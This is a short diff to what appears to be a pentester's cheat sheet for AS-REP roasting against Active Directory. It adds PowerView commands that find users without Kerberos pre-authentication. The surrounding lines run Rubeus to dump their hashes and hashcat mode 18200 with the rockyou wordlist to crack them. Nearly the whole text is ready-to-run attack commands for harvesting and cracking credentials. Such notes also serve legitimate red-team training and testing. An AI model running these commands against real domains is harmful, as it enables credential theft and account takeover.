@@ -11,5 +11,9 @@ $ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /u
 
 
 ========== ON WINDOWS ===========
+# To identify vulnerable users:
+import-module powerview.ps1
+.\Get-DomainUser -PreauthNotRequired
+
 .\Rubeus.exe asreproast /nowrap
 $ sudo hashcat -m 18200 hashes2.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
